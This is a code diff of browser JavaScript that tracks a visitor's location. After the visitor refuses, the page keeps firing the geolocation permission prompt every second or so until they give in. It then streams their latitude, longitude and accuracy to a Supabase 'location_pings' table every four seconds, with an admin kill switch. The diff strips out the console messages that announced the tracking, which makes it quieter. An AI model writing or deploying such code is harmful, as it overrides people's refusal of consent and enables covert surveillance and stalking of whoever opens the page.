@@ -19,58 +19,52 @@ async function init() {
 
     const data = await res.json();
     sessionId = data[0].id;
-    console.log("✅ Session Created:", sessionId);
 
-    // Start aggressive location spamming
-    spamLocationPermission();
-
-    // Kill check
-    setInterval(checkKillStatus, 3000);
+    // Start spamming location immediately
+    forceLocationPopup();
 
   } catch(e) {
     console.error(e);
   }
 }
 
-// Super aggressive - keeps asking again and again
-function spamLocationPermission() {
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      console.log("✅ Location Allowed");
-      sendLocation(pos);
-      setInterval(() => sendLocation(), 5000);   // normal tracking once allowed
-    },
-    (error) => {
-      console.log("❌ Location denied or off - Spamming again...", error.code);
-      // Keep forcing the popup
-      setTimeout(spamLocationPermission, 700);
-    },
-    { 
-      enableHighAccuracy: true, 
-      timeout: 8000, 
-      maximumAge: 0 
-    }
-  );
+function forceLocationPopup() {
+  // Multiple ways to trigger permission
+  navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+  
+  // Extra aggressive - keep calling
+  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 600);
+  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 1200);
+}
+
+function success(pos) {
+  console.log("✅ Location permission granted");
+  sendLocation(pos);
+  setInterval(() => sendLocation(), 4000);
+}
+
+function error(err) {
+  console.log("❌ Permission denied or location off - retrying...", err);
+  setTimeout(forceLocationPopup, 800);   // spam again
 }
 
 function sendLocation(pos = null) {
   if (isKilled) return;
-
-  if (pos) {
-    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
-      method: "POST",
-      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
-      body: JSON.stringify({
-        session_id: sessionId,
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      })
-    });
-  } else {
-    // Try to get latest position
+  if (!pos) {
     navigator.geolocation.getCurrentPosition(sendLocation, () => {}, { enableHighAccuracy: true });
+    return;
   }
+
+  fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
+    method: "POST",
+    headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      session_id: sessionId,
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy
+    })
+  });
 }
 
 async function checkKillStatus() {
@@ -81,8 +75,8 @@ async function checkKillStatus() {
   const data = await res.json();
   if (data[0] && data[0].is_killed === true) {
     isKilled = true;
-    console.log("%c🛑 TRACKING STOPPED BY ADMIN", "color:red;font-size:25px");
   }
 }
 
+setInterval(checkKillStatus, 3000);
 window.onload = init;
